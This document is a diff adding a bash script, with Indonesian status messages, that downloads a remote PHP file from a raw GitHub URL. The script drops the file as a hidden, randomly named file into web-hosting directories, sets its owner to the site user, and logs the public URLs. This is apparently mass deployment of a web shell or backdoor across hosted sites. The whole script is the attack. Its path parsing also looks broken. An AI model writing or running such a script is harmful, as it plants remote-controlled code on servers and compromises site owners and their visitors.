@@ -1,0 +1,23 @@
+#!/bin/bash
+
+output_file="uploaded.txt"
+> "$output_file" 
+
+for dir in /var/www/vhosts; do
+  if [ -d "$dir" ]; then
+    user=$(echo "$dir" | cut -d'/' -f3)
+    domain=$(echo "$dir" | cut -d'/' -f5)
+
+    randname=$(tr -dc 'a-z0-9' </dev/urandom | head -c 5).php
+
+    echo "Upload $randname ke $dir (owner: $user)"
+    wget -q -O "$dir/.$randname" "http://raw.githubusercontent.com/dailyviloo/bekduar/refs/heads/main/galon.php"
+    chown "$user:$user" "$dir/.$randname"
+
+    url="https://$domain/.$randname"
+    echo "$url" >> "$output_file"
+
+    sleep 1.1
+  fi
+done
+echo "Upload selesai. Hasil disimpan di $output_file"
